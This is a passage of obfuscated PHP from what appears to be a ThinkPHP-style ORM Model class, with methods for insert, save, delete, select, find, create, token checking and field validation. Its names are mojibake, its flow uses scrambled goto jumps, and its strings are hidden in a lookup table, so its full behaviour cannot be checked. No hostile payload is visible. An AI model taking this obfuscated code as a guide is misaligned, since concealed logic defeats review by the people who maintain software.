$this->db->insertAll($bÙ€òˆÌãé, $bÂöæƒ†·Û, $e¥™∆‡äúÜ); } else { $this->startTrans(); foreach ($bÙ€òˆÌãé as $eˆá∆•Û∞Ô => $aé≥é”ı‰Î) { $fÿŒ¥ëàÙ¯ = $this->db->insert($aé≥é”ı‰Î, $bÂöæƒ†·Û, $e¥™∆‡äúÜ); } $this->commit(); } if (!1 !== $fÿŒ¥ëàÙ¯) { $d¯øÒÌú√é = $this->getLastInsID(); if ($d¯øÒÌú√é) { return $d¯øÒÌú√é; } } goto fïë“°¥„ô; b“‚ÚÒÌàè: $FﬂÑ„≈ÒÚÖ =& $_SERVER[ú∫]; if (empty($bÙ€òˆÌãé)) { $this->error = think_lang($FﬂÑ„≈ÒÚÖ[269]); return !1; } $bÂöæƒ†·Û = $this->_parseOptions($bÂöæƒ†·Û); goto FÆÕõ»“∆›; fïë“°¥„ô: return $fÿŒ¥ëàÙ¯; goto CπïÀ∆à¯É; CπïÀ∆à¯É: } public function selectAdd($bïº¬∂óÎÍ = '', $aìﬁ¬Ô‰æ™ = '', $Cê ◊ßèõÇ = array()) { $aÇæ‹òìâì =& $_SERVER[ú∫]; $Cê ◊ßèõÇ = $this->_parseOptions($Cê ◊ßèõÇ); if (!1 === ($c≤§ƒñ˘ô… = $this->db->selectInsert($bïº¬∂óÎÍ ? $bïº¬∂óÎÍ : $Cê ◊ßèõÇ[$aÇæ‹òìâì[271]], $aìﬁ¬Ô‰æ™ ? $aìﬁ¬Ô‰æ™ : $this->getTableName(), $Cê ◊ßèõÇ))) { $this->error = think_lang($aÇæ‹òìâì[272]); return !1; } else { return $c≤§ƒñ˘ô…; } } public function save($a†‹î÷ﬁá‰ = '', $díÍ∆œµâ≤ = array()) { goto c¶®–ê‚ê™; d®–¯Ω™ó°: $díÍ∆œµâ≤ = $this->_parseOptions($díÍ∆œµâ≤); $E’íˆ◊¢ŒÙ = $this->getPk(); if (!isset($díÍ∆œµâ≤[$eÖâ◊Áå≈ß[273]])) { if (isset($a†‹î÷ﬁá‰[$E’íˆ◊¢ŒÙ])) { $eΩÉ≤á∞≈…[$E’íˆ◊¢ŒÙ] = $a†‹î÷ﬁá‰[$E’íˆ◊¢ŒÙ]; $díÍ∆œµâ≤[$eÖâ◊Áå≈ß[273]] = $eΩÉ≤á∞≈…; unset($a†‹î÷ﬁá‰[$E’íˆ◊¢ŒÙ]); } else { $this->error = think_lang($eÖâ◊Áå≈ß[272]); return !1; } } goto e’ùÉº∏≤«; e’ùÉº∏≤«: if (is_array($díÍ∆œµâ≤[$eÖâ◊Áå≈ß[273]]) && isset($díÍ∆œµâ≤[$eÖâ◊Áå≈ß[273]][$E’íˆ◊¢ŒÙ])) { $B°è¯‘Æ¢¨ = $díÍ∆œµâ≤[$eÖâ◊Áå≈ß[273]][$E’íˆ◊¢ŒÙ]; } if (!1 === $this->_beforeUpdate($a†‹î÷ﬁá‰, $díÍ∆œµâ≤)) { return !1; } $B˜ÛÜØ›µ∞ = $this->db->update($a†‹î÷ﬁá‰, $díÍ∆œµâ≤); goto B˜–Ñ≥¯ö∞; B˜–Ñ≥¯ö∞: if (!1 !== $B˜ÛÜØ›µ∞) { if (isset($B°è¯‘Æ¢¨)) { $a†‹î÷ﬁá‰[$E’íˆ◊¢ŒÙ] = $B°è¯‘Æ¢¨; } $this->_afterUpdate($a†‹î÷ﬁá‰, $díÍ∆œµâ≤); } return $B˜ÛÜØ›µ∞; goto cûÑ◊È±ıæ; c¶®–ê‚ê™: $eÖâ◊Áå≈ß =& $_SERVER[ú∫]; if (empty($a†‹î÷ﬁá‰)) { if (!empty($this->data)) { $a†‹î÷ﬁá‰ = $this->data; $this->data = array(); } else { $this->error = think_lang($eÖâ◊Áå≈ß[269]); return !1; } } $a†‹î÷ﬁá‰ = $this->_facade($a†‹î÷ﬁá‰); goto d®–¯Ω™ó°; cûÑ◊È±ıæ: } protected function _beforeUpdate(&$D¯€ÛÌ›è, $fô€Ô¿Ö‘Â) { } protected function _afterUpdate($f§–ÍˆˆåÖ, $c◊«ÁùÁï≈) { } public function delete($FŸøëﬁÎàõ = array()) { goto cΩÓãê∫ÒŒ; FÏﬁÛÈ’Ìî: if (is_numeric($FŸøëﬁÎàõ) || is_string($FŸøëﬁÎàõ)) { if (strpos($FŸøëﬁÎàõ, $E≈ì ™∑Ÿú[47])) { $C÷¡ØÒ©√ã[$A≈ï§àÌ÷à] = array($E≈ì ™∑Ÿú[274], $FŸøëﬁÎàõ); } else { $C÷¡ØÒ©√ã[$A≈ï§àÌ÷à] = $FŸøëﬁÎàõ; } $this->options[$E≈ì ™∑Ÿú[273]] = $C÷¡ØÒ©√ã; } $FŸøëﬁÎàõ = $this->_parseOptions(); if (is_array($FŸøëﬁÎàõ[$E≈ì ™∑Ÿú[273]]) && isset($FŸøëﬁÎàõ[$E≈ì ™∑Ÿú[273]][$A≈ï§àÌ÷à])) { $D∑∏•ûÀÉ = $FŸøëﬁÎàõ[$E≈ì ™∑Ÿú[273]][$A≈ï§àÌ÷à]; } goto AÀ•ìö“”é; cΩÓãê∫ÒŒ: $E≈ì ™∑Ÿú =& $_SERVER[ú∫]; if (empty($FŸøëﬁÎàõ) && empty($this->options[$E≈ì ™∑Ÿú[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $A≈ï§àÌ÷à = $this->getPk(); goto FÏﬁÛÈ’Ìî; AÀ•ìö“”é: $fßùÓ¡´Êé = $this->db->delete($FŸøëﬁÎàõ); if (!1 !== $fßùÓ¡´Êé) { $AíåÁ‰‰ﬁÒ = array(); if (isset($D∑∏•ûÀÉ)) { $AíåÁ‰‰ﬁÒ[$A≈ï§àÌ÷à] = $D∑∏•ûÀÉ; } $this->_after_delete($AíåÁ‰‰ﬁÒ, $FŸøëﬁÎàõ); } return $fßùÓ¡´Êé; goto BÛæ»‰πÀ◊; BÛæ»‰πÀ◊: } protected function _after_delete($e„ª‰≤ûÎÖ, $Aô»¡⁄éÔ⁄) { } public function select($F´åõéÑ¨« = array()) { goto FÚÍòà© á; Fí©ò·Ωë®: $Fè÷îÍá¶÷ = $this->db->select($F´åõéÑ¨«); if (!1 === $Fè÷îÍá¶÷) { return !1; } if (empty($Fè÷îÍá¶÷)) { return null; } goto E–É≤Î¿„â; FÚÍòà© á: $c‘ÔÃÎˆóµ =& $_SERVER[ú∫]; if (is_string($F´åõéÑ¨«) || is_numeric($F´åõéÑ¨«)) { $dëîÈ”á§É = $this->getPk(); if (strpos($F´åõéÑ¨«, $c‘ÔÃÎˆóµ[47])) { $c≥øöëóë‘[$dëîÈ”á§É] = array($c‘ÔÃÎˆóµ[274], $F´åõéÑ¨«); } else { $c≥øöëóë‘[$dëîÈ”á§É] = $F´åõéÑ¨«; } $this->options[$c‘ÔÃÎˆóµ[273]] = $c≥øöëóë‘; } elseif (!1 === $F´åõéÑ¨«) { $F´åõéÑ¨« = $this->_parseOptions(); return $c‘ÔÃÎˆóµ[275] . $this->db->buildSelectSql($F´åõéÑ¨«) . $c‘ÔÃÎˆóµ[276]; } $F´åõéÑ¨« = $this->_parseOptions(); goto Fí©ò·Ωë®; E–É≤Î¿„â: $this->_afterSelect($Fè÷îÍá¶÷, $F´åõéÑ¨«); return $Fè÷îÍá¶÷; goto a¿™≈ØªÊ¡; a¿™≈ØªÊ¡: } protected function _afterSelect(&$Eª†¥≈¬äï, $fé¶ãõ∏Î…) { } public function buildSql($déÑÖ’€Ùﬂ = array()) { $d¬ù’Ó¿∫µ =& $_SERVER[ú∫]; $déÑÖ’€Ùﬂ = $this->_parseOptions($déÑÖ’€Ùﬂ); return $d¬ù’Ó¿∫µ[275] . $this->db->buildSelectSql($déÑÖ’€Ùﬂ) . $d¬ù’Ó¿∫µ[276]; } public function optionsValue($fÒÿÌ”Ó«ß = null) { if (is_null($fÒÿÌ”Ó«ß)) { return $this->options; } elseif (is_array($fÒÿÌ”Ó«ß)) { $this->options = array_merge($this->options, $fÒÿÌ”Ó«ß); } } protected function _parseOptions($AÍ≠ñ¢éºã = array()) { goto AÏ≈⁄ÆÙÃÆ; D“•ÑŒ˜’·: if (!isset($AÍ≠ñ¢éºã[$E–àÇëáµÛ[277]])) { $AÍ≠ñ¢éºã[$E–àÇëáµÛ[277]] = $this->getTableName(); $eäåöÙˆÔ∞ = $this->fields; } else { $eäåöÙˆÔ∞ = $this->getDbFields(); } if (!empty($AÍ≠ñ¢éºã[$E–àÇëáµÛ[278]])) { $AÍ≠ñ¢éºã[$E–àÇëáµÛ[277]] .= $E–àÇëáµÛ[50] . $AÍ≠ñ¢éºã[$E–àÇëáµÛ[278]]; } $AÍ≠ñ¢éºã[$E–àÇëáµÛ[279]] = $this->name; goto DŸûå‚Ÿ»–; AÏ≈⁄ÆÙÃÆ: $E–àÇëáµÛ =& $_SERVER[ú∫]; if (is_array($AÍ≠ñ¢éºã)) { $AÍ≠ñ¢éºã = array_merge($this->options, $AÍ≠ñ¢éºã); } $this->options = array(); goto D“•ÑŒ˜’·; DŸûå‚Ÿ»–: if (isset($AÍ≠ñ¢éºã[$E–àÇëáµÛ[273]]) && is_array($AÍ≠ñ¢éºã[$E–àÇëáµÛ[273]]) && !empty($eäåöÙˆÔ∞) && !isset($AÍ≠ñ¢éºã[$E–àÇëáµÛ[280]]) && !isset($AÍ≠ñ¢éºã[$E–àÇëáµÛ[277]])) { foreach ($AÍ≠ñ¢éºã[$E–àÇëáµÛ[273]] as $EéÑôê´Òÿ => $dÓÂÜ‘´Ô∏) { $EéÑôê´Òÿ = trim($EéÑôê´Òÿ); if (in_array($EéÑôê´Òÿ, $eäåöÙˆÔ∞, !0)) { if (is_scalar($dÓÂÜ‘´Ô∏)) { $this->_parseType($AÍ≠ñ¢éºã[$E–àÇëáµÛ[273]], $EéÑôê´Òÿ); } } elseif (!is_numeric($EéÑôê´Òÿ) && $E–àÇëáµÛ[71] != substr($EéÑôê´Òÿ, 0, 1) && !1 === strpos($EéÑôê´Òÿ, $E–àÇëáµÛ[95]) && !1 === strpos($EéÑôê´Òÿ, $E–àÇëáµÛ[258]) && !1 === strpos($EéÑôê´Òÿ, $E–àÇëáµÛ[281]) && !1 === strpos($EéÑôê´Òÿ, $E–àÇëáµÛ[282])) { unset($AÍ≠ñ¢éºã[$E–àÇëáµÛ[273]][$EéÑôê´Òÿ]); } } } $this->_options_filter($AÍ≠ñ¢éºã); return $AÍ≠ñ¢éºã; goto aæëÔ¥õﬂ∞; aæëÔ¥õﬂ∞: } protected function _options_filter(&$f⁄ØÜ◊Ê∏˘) { } protected function _parseType(&$eÚ≤ ¡≤Õ“, $båõ¬©Çø) { $D’î◊àä±Ñ =& $_SERVER[ú∫]; if (empty($this->options[$D’î◊àä±Ñ[283]][$D’î◊àä±Ñ[4] . $båõ¬©Çø])) { $AÈΩËÑ‘É© = strtolower($this->fields[$D’î◊àä±Ñ[250]][$båõ¬©Çø]); if (!1 !== strpos($AÈΩËÑ‘É©, $D’î◊àä±Ñ[284])) { } elseif (!1 === strpos($AÈΩËÑ‘É©, $D’î◊àä±Ñ[285]) && !1 !== strpos($AÈΩËÑ‘É©, $D’î◊àä±Ñ[286])) { $eÚ≤ ¡≤Õ“[$båõ¬©Çø] = intval($eÚ≤ ¡≤Õ“[$båõ¬©Çø]); } elseif (!1 !== strpos($AÈΩËÑ‘É©, $D’î◊àä±Ñ[287]) || !1 !== strpos($AÈΩËÑ‘É©, $D’î◊àä±Ñ[288])) { $eÚ≤ ¡≤Õ“[$båõ¬©Çø] = floatval($eÚ≤ ¡≤Õ“[$båõ¬©Çø]); } elseif (!1 !== strpos($AÈΩËÑ‘É©, $D’î◊àä±Ñ[289])) { $eÚ≤ ¡≤Õ“[$båõ¬©Çø] = (bool) $eÚ≤ ¡≤Õ“[$båõ¬©Çø]; } } } public function find($E¢≤Ú–ã§‹ = array()) { goto CŸÔœâá≠é; CŸÔœâá≠é: $e®€⁄ÇáÂã =& $_SERVER[ú∫]; if (is_numeric($E¢≤Ú–ã§‹) || is_string($E¢≤Ú–ã§‹)) { $Eâƒ«æÛèá[$this->getPk()] = intval($E¢≤Ú–ã§‹); $this->options[$e®€⁄ÇáÂã[273]] = $Eâƒ«æÛèá; } $this->options[$e®€⁄ÇáÂã[290]] = 1; goto C∞ã¥ÕÂ∆§; cßºì€ÃÀÕ: if (empty($FÇΩüÚêúü)) { return null; } $this->data = $FÇΩüÚêúü[0]; $this->_afterFind($this->data, $E¢≤Ú–ã§‹); goto a≥⁄ûΩ´ÿë; C∞ã¥ÕÂ∆§: $E¢≤Ú–ã§‹ = $this->_parseOptions(); $FÇΩüÚêúü = $this->db->select($E¢≤Ú–ã§‹); if (!1 === $FÇΩüÚêúü) { return !1; } goto cßºì€ÃÀÕ; a≥⁄ûΩ´ÿë: if (!empty($this->options[$e®€⁄ÇáÂã[291]])) { return $this->returnResult($this->data, $this->options[$e®€⁄ÇáÂã[291]]); } return $this->data; goto bÀ…¥“µìÃ; bÀ…¥“µìÃ: } protected function _afterFind(&$C∂îè…¬‹Ω, $AÊ£’◊ ¯ ) { } protected function returnResult($BÜó“†‘«–, $Eæ€ﬂØ∫ƒ· = '') { $CÎÇÎÁ≤ÎÑ =& $_SERVER[ú∫]; if ($Eæ€ﬂØ∫ƒ·) { if (is_callable($Eæ€ﬂØ∫ƒ·)) { return call_user_func($Eæ€ﬂØ∫ƒ·, $BÜó“†‘«–); } switch (strtolower($Eæ€ﬂØ∫ƒ·)) { case $CÎÇÎÁ≤ÎÑ[292]: return json_encode($BÜó“†‘«–); case $CÎÇÎÁ≤ÎÑ[293]: return xml_encode($BÜó“†‘«–); } } return $BÜó“†‘«–; } public function parseFieldsMap($cﬂ“ÊﬂâÓƒ, $C∏ùõ«ûÈÖ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $b∏¿Ï≤ÖÆ» => $câÙªˆ‘âÑ) { if ($C∏ùõ«ûÈÖ == 1) { if (isset($cﬂ“ÊﬂâÓƒ[$câÙªˆ‘âÑ])) { $cﬂ“ÊﬂâÓƒ[$b∏¿Ï≤ÖÆ»] = $cﬂ“ÊﬂâÓƒ[$câÙªˆ‘âÑ]; unset($cﬂ“ÊﬂâÓƒ[$câÙªˆ‘âÑ]); } } else { if (isset($cﬂ“ÊﬂâÓƒ[$b∏¿Ï≤ÖÆ»])) { $cﬂ“ÊﬂâÓƒ[$câÙªˆ‘âÑ] = $cﬂ“ÊﬂâÓƒ[$b∏¿Ï≤ÖÆ»]; unset($cﬂ“ÊﬂâÓƒ[$b∏¿Ï≤ÖÆ»]); } } } } return $cﬂ“ÊﬂâÓƒ; } public function setField($F®Û£ÿ—âü, $dûèÑ–µƒ∑ = '') { if (is_array($F®Û£ÿ—âü)) { $CÀ”êÎºŸ§ = $F®Û£ÿ—âü; } else { $CÀ”êÎºŸ§[$F®Û£ÿ—âü] = $dûèÑ–µƒ∑; } return $this->save($CÀ”êÎºŸ§); } public function setAdd($D¯¡êΩàÇü, $E∑Ÿ©éƒ ‹ = 1) { $eΩúéú—¡° =& $_SERVER[ú∫]; $dâà‡æ£¨◊ = $D¯¡êΩàÇü . $eΩúéú—¡°[294] . $E∑Ÿ©éƒ ‹; if ($E∑Ÿ©éƒ ‹ < 0) { $dâà‡æ£¨◊ = $D¯¡êΩàÇü . $E∑Ÿ©éƒ ‹; } return $this->setField($D¯¡êΩàÇü, array($eΩúéú—¡°[295], $dâà‡æ£¨◊)); } public function getField($B‹È¶Ç≤Ê‚, $E«Ç°∂ÿäÔ = null) { $aﬁÂ¶πæÇŒ =& $_SERVER[ú∫]; $B◊©ë´Ó∆Â[$aﬁÂ¶πæÇŒ[271]] = $B‹È¶Ç≤Ê‚; $B◊©ë´Ó∆Â = $this->_parseOptions($B◊©ë´Ó∆Â); $B‹È¶Ç≤Ê‚ = trim($B‹È¶Ç≤Ê‚); if (strpos($B‹È¶Ç≤Ê‚, $aﬁÂ¶πæÇŒ[47])) { if (!isset($B◊©ë´Ó∆Â[$aﬁÂ¶πæÇŒ[290]])) { $B◊©ë´Ó∆Â[$aﬁÂ¶πæÇŒ[290]] = is_numeric($E«Ç°∂ÿäÔ) ? $E«Ç°∂ÿäÔ : $aﬁÂ¶πæÇŒ[33]; } $fÛëÍ◊”Èå = $this->db->select($B◊©ë´Ó∆Â); if (!empty($fÛëÍ◊”Èå)) { goto FÁÂü¢Øˆ¿; FÁÂü¢Øˆ¿: $c¡›ª¶„ıø = explode($aﬁÂ¶πæÇŒ[47], $B‹È¶Ç≤Ê‚); $B‹È¶Ç≤Ê‚ = array_keys($fÛëÍ◊”Èå[0]); $bÂ·∏¡®™ñ = array_shift($B‹È¶Ç≤Ê‚); goto CèêßÜÃÓ¯; CèêßÜÃÓ¯: $AËºñÂèôò = array_shift($B‹È¶Ç≤Ê‚); $eÆ∏øûÜÜã = array(); $B“ìÃÁ·ÿÊ = count($c¡›ª¶„ıø); goto a©°›¢™÷«; a©°›¢™÷«: foreach ($fÛëÍ◊”Èå as $fàã—œÏﬁÔ) { $B°Œ•æ≤á„ = $fàã—œÏﬁÔ[$bÂ·∏¡®™ñ]; if (2 == $B“ìÃÁ·ÿÊ) { $eÆ∏øûÜÜã[$B°Œ•æ≤á„] = $fàã—œÏﬁÔ[$AËºñÂèôò]; } else { $eÆ∏øûÜÜã[$B°Œ•æ≤á„] = is_string($E«Ç°∂ÿäÔ) ? implode($E«Ç°∂ÿäÔ, $fàã—œÏﬁÔ) : $fàã—œÏﬁÔ; } } return $eÆ∏øûÜÜã; goto B«íßîÃÏÛ; B«íßîÃÏÛ: } } else { if (!0 !== $E«Ç°∂ÿäÔ) { $B◊©ë´Ó∆Â[$aﬁÂ¶πæÇŒ[290]] = is_numeric($E«Ç°∂ÿäÔ) ? $E«Ç°∂ÿäÔ : 1; } if ($E«Ç°∂ÿäÔ === $aﬁÂ¶πæÇŒ[253]) { unset($B◊©ë´Ó∆Â[$aﬁÂ¶πæÇŒ[290]]); } $fàã—œÏﬁÔ = $this->db->select($B◊©ë´Ó∆Â); if (!empty($fàã—œÏﬁÔ)) { if ($E«Ç°∂ÿäÔ === $aﬁÂ¶πæÇŒ[253]) { return reset($fàã—œÏﬁÔ[0]); } if (!0 !== $E«Ç°∂ÿäÔ && 1 == $B◊©ë´Ó∆Â[$aﬁÂ¶πæÇŒ[290]]) { return reset($fàã—œÏﬁÔ[0]); } foreach ($fàã—œÏﬁÔ as $AŒ¿±é üß) { $AÏ ìêáù’[] = $AŒ¿±é üß[$B‹È¶Ç≤Ê‚]; } return $AÏ ìêáù’; } } return null; } public function create($b”ëù†©Öñ = '', $BÇÙäœøÎë = '') { goto f‘Ãﬂè–Öπ; b≠®¬√á¥à: if ($this->autoCheckFields) { $aÑ¶åŸ∆Ú– = $this->getDbFields(); foreach ($b”ëù†©Öñ as $B«Á“âìà∏ => $b¯”ÙÆ±ä™) { if (!in_array($B«Á“âìà∏, $aÑ¶åŸ∆Ú–)) { unset($b”ëù†©Öñ[$B«Á“âìà∏]); } elseif (MAGIC_QUOTES_GPC && is_string($b¯”ÙÆ±ä™)) { $b”ëù†©Öñ[$B«Á“âìà∏] = stripslashes($b¯”ÙÆ±ä™); } } } $this->autoOperation($b”ëù†©Öñ, $BÇÙäœøÎë); $this->data = $b”ëù†©Öñ; goto fÆÕéäÚú∆; f‘Ãﬂè–Öπ: $b•äõÛÊœ =& $_SERVER[ú∫]; if (empty($b”ëù†©Öñ)) { $b”ëù†©Öñ = $_POST; } elseif (is_object($b”ëù†©Öñ)) { $b”ëù†©Öñ = get_object_vars($b”ëù†©Öñ); } if (empty($b”ëù†©Öñ) || !is_array($b”ëù†©Öñ)) { $this->error = think_lang($b•äõÛÊœ[269]); return !1; } goto B„èπÃ≈πµ; fÆÕéäÚú∆: return $b”ëù†©Öñ; goto cé÷π∏ŸßÔ; B„èπÃ≈πµ: $b”ëù†©Öñ = $this->parseFieldsMap($b”ëù†©Öñ, 0); $BÇÙäœøÎë = $BÇÙäœøÎë ? $BÇÙäœøÎë : (!empty($b”ëù†©Öñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$b•äõÛÊœ[271]])) { $aÑ¶åŸ∆Ú– = $this->options[$b•äõÛÊœ[271]]; unset($this->options[$b•äõÛÊœ[271]]); } elseif ($BÇÙäœøÎë == THINK_MODEL_INSERT && isset($this->insertFields)) { $aÑ¶åŸ∆Ú– = $this->insertFields; } elseif ($BÇÙäœøÎë == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aÑ¶åŸ∆Ú– = $this->updateFields; } goto f¿ìà¥∑ê·; f¿ìà¥∑ê·: if (isset($aÑ¶åŸ∆Ú–)) { if (is_string($aÑ¶åŸ∆Ú–)) { $aÑ¶åŸ∆Ú– = explode($b•äõÛÊœ[47], $aÑ¶åŸ∆Ú–); } if (think_config($b•äõÛÊœ[296])) { $aÑ¶åŸ∆Ú–[] = think_config($b•äõÛÊœ[297]); } foreach ($b”ëù†©Öñ as $B«Á“âìà∏ => $b¯”ÙÆ±ä™) { if (!in_array($B«Á“âìà∏, $aÑ¶åŸ∆Ú–)) { unset($b”ëù†©Öñ[$B«Á“âìà∏]); } } } if (!$this->autoValidation($b”ëù†©Öñ, $BÇÙäœøÎë)) { return !1; } if (!$this->autoCheckToken($b”ëù†©Öñ)) { $this->error = think_lang($b•äõÛÊœ[298]); return !1; } goto b≠®¬√á¥à; cé÷π∏ŸßÔ: } public function autoCheckToken($b®õ¥⁄ø˘Ï) { $F¨†‘Ê“ò =& $_SERVER[ú∫]; if (isset($this->options[$F¨†‘Ê“ò[299]]) && !$this->options[$F¨†‘Ê“ò[299]]) { return !0; } if (think_config($F¨†‘Ê“ò[296])) { $FÛÌıÑæÉÛ = think_config($F¨†‘Ê“ò[297]); if (!isset($b®õ¥⁄ø˘Ï[$FÛÌıÑæÉÛ]) || Session::get($FÛÌıÑæÉÛ)) { return !1; } list($C¬·äïäú¿, $D»”ﬁàó◊›) = explode($F¨†‘Ê“ò[71], $b®õ¥⁄ø˘Ï[$FÛÌıÑæÉÛ]); if ($D»”ﬁàó◊› && Session::get($FÛÌıÑæÉÛ . $F¨†‘Ê“ò[95] . $C¬·äïäú¿) === $D»”ﬁàó◊›) { Session::remove($FÛÌıÑæÉÛ . $F¨†‘Ê“ò[95] . $C¬·äïäú¿); return !0; } if (think_config($F¨†‘Ê“ò[300])) { Session::remove($FÛÌıÑæÉÛ . $F¨†‘Ê“ò[95] . $C¬·äïäú¿); } return !1; } return !0; } public function regex($CÒ„ƒ˜£µ‚, $AÊ»û’ßú¶) { $E´¶ç·Ôÿâ =& $_SERVER[ú∫]; $aáìØ∏®¿ˆ = array($E´¶ç·Ôÿâ[301] => $E´¶ç·Ôÿâ[302], $E´¶ç·Ôÿâ[303] => $E´¶ç·Ôÿâ[304], $E´¶ç·Ôÿâ[305] => $E´¶ç·Ôÿâ[306], $E´¶ç·Ôÿâ[307] => $E´¶ç·Ôÿâ[308], $E´¶ç·Ôÿâ[309] => $E´¶ç·Ôÿâ[310], $E´¶ç·Ôÿâ[311] => $E´¶ç·Ôÿâ[312], $E´¶ç·Ôÿâ[313] => $E´¶ç·Ôÿâ[314], $E´¶ç·Ôÿâ[288] => $E´¶ç·Ôÿâ[315], $E´¶ç·Ôÿâ[316] => $E´¶ç·Ôÿâ[317]); if (isset($aáìØ∏®¿ˆ[strtolower($AÊ»û’ßú¶)])) { $AÊ»û’ßú¶ = $aáìØ∏®¿ˆ[strtolower($AÊ»û’ßú¶)]; } return preg_match($AÊ»û’ßú¶, $CÒ„ƒ˜£µ‚) === 1; } private function autoOperation(&$bì‘—ﬂ˘ç∂, $C„üÒ»Ñ÷Ò) { $FœØè∞µùá =& $_SERVER[ú∫]; if (!empty($this->options[$FœØè∞µùá[318]])) { $Dπ¿–¯ú¶Æ = $this->options[$FœØè∞µùá[318]]; unset($this->options[$FœØè∞µùá[318]]); } elseif (!empty($this->_auto)) { $Dπ¿–¯ú¶Æ = $this->_auto; } if (isset($Dπ¿–¯ú¶Æ)) { foreach ($Dπ¿–¯ú¶Æ as $a√Âäºÿ©) { if (empty($a√Âäºÿ©[2])) { $a√Âäºÿ©[2] = THINK_MODEL_INSERT; } if ($C„üÒ»Ñ÷Ò == $a√Âäºÿ©[2] || $a√Âäºÿ©[2] == THINK_MODEL_BOTH) { switch (trim($a√Âäºÿ©[3])) { case $FœØè∞µùá[319]: case $FœØè∞µùá[320]: $C°è…êÇ£Õ = isset($a√Âäºÿ©[4]) ? (array) $a√Âäºÿ©[4] : array(); if (isset($bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]])) { array_unshift($C°è…êÇ£Õ, $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]]); } if ($FœØè∞µùá[319] == $a√Âäºÿ©[3]) { $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]] = call_user_func_array($a√Âäºÿ©[1], $C°è…êÇ£Õ); } else { $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]] = call_user_func_array(array(&$this, $a√Âäºÿ©[1]), $C°è…êÇ£Õ); } break; case $FœØè∞µùá[271]: $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]] = $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[1]]; break; case $FœØè∞µùá[321]: if ($FœØè∞µùá[33] === $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]]) { unset($bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]]); } break; case $FœØè∞µùá[322]: default: $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]] = $a√Âäºÿ©[1]; } if (!1 === $bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]]) { unset($bì‘—ﬂ˘ç∂[$a√Âäºÿ©[0]]); } } } } return $bì‘—ﬂ˘ç∂; } protected function autoValidation($eù§›ïµ·©, $døÚàø√Ã‘) { $c€Ÿ∆ÍÉ‰‡ =& $_SERVER[ú∫]; if (!empty($this->options[$c€Ÿ∆ÍÉ‰‡[323]])) { $bÒ“ÕèÂ•ﬂ = $this->options[$c€Ÿ∆ÍÉ‰‡[323]]; unset($this->options[$c€Ÿ∆ÍÉ‰‡[323]]); } elseif (!empty($this->_validate)) { $bÒ“ÕèÂ•ﬂ = $this->_validate; } if (isset($bÒ“ÕèÂ•ﬂ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bÒ“ÕèÂ•ﬂ as $Dµ¥ÎÁù•Ê => $BÀ‹—§É†—) { if (empty($BÀ‹—§É†—[5]) || $BÀ‹—§É†—[5] == THINK_MODEL_BOTH || $BÀ‹—§É†—[5] == $døÚàø√Ã‘) { if (0 == strpos($BÀ‹—§É†—[2], $c€Ÿ∆ÍÉ‰‡[324]) && strpos($BÀ‹—§É†—[2], $c€Ÿ∆ÍÉ‰‡[325])) { $BÀ‹—§É†—[2] = think_lang(substr($BÀ‹—§É†—[2], 2, -1)); } $BÀ‹—§É†—[3] = isset($BÀ‹—§É†—[3]) ? $BÀ‹—§É†—[3] : THINK_EXISTS_VALIDATE; $BÀ‹—§É†—[4] = isset($BÀ‹—§É†—[4]) ? $BÀ‹—§É†—[4] : $c€Ÿ∆ÍÉ‰‡[326]; switch ($BÀ‹—§É†—[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($eù§›ïµ·©, $BÀ‹—§É†—)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($c€Ÿ∆ÍÉ‰‡[33] != trim($eù§›ïµ·©[$BÀ‹—§É†—[0]])) { if (!1 === $this->_validationField($eù§›ïµ·©, $BÀ‹—§É†—)) { return !1; } } break; default: if (isset($eù§›ïµ·©[$BÀ‹—§É†—[0]])) { if (!1 === $this->_validationField($eù§›ïµ·©, $BÀ‹—§É†—)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Bäº±È≥äÌ, $e«ßç’¢é’) { if (!1 === $this->_validationFieldItem($Bäº±È≥äÌ, $e«ßç’¢é’)) { if ($this->patchValidate) { $this->error[$e«ßç’¢é’[0]] = $e«ßç’¢é’[2]; } else { $this->error = $e«ßç’¢é’[2]; return !1; } } return; } protected function _validationFieldItem($C÷ÈÔ§ÀﬁÕ, $f«˘¶ïÌÑã) { $fêÃ·πû£ñ =& $_SERVER[ú∫]; switch (strtolower(trim($f«˘¶ïÌÑã[4]))) { case $fêÃ·πû£ñ[319]: case $fêÃ·πû£ñ[320]: $Aª⁄πäÙâ = isset($f«˘¶ïÌÑã[6]) ? (array) $f«˘¶ïÌÑã[6] : array(); if (is_string($f«˘¶ïÌÑã[0]) && strpos($f«˘¶ïÌÑã[0], $fêÃ·πû£ñ[47])) { $f«˘¶ïÌÑã[0] = explode($fêÃ·πû£ñ[47], $f«˘¶ïÌÑã[0]); } if (is_array($f«˘¶ïÌÑã[0])) { foreach ($f«˘¶ïÌÑã[0] as $B £ó∑Òá◊) { $dÙ¡ë»êã[$B £ó∑Òá◊] = $C÷ÈÔ§ÀﬁÕ[$B £ó∑Òá◊]; } array_unshift($Aª⁄πäÙâ, $dÙ¡ë»êã); } else { array_unshift($Aª⁄πäÙâ, $C÷ÈÔ§ÀﬁÕ[$f«˘¶ïÌÑã[0]]); } if ($fêÃ·πû£ñ[319] == $f«˘¶ïÌÑã[4]) { return call_user_func_array($f«˘¶ïÌÑã[1], $Aª⁄πäÙâ); } else { return call_user_func_array(array(&$this, $f«˘¶ïÌÑã[1]), $Aª⁄πäÙâ); } case $fêÃ·πû£ñ[327]: return $C÷ÈÔ§ÀﬁÕ[$f«˘¶ïÌÑã[0]] == $C÷ÈÔ§ÀﬁÕ[$f«˘¶ïÌÑã[1]]; case 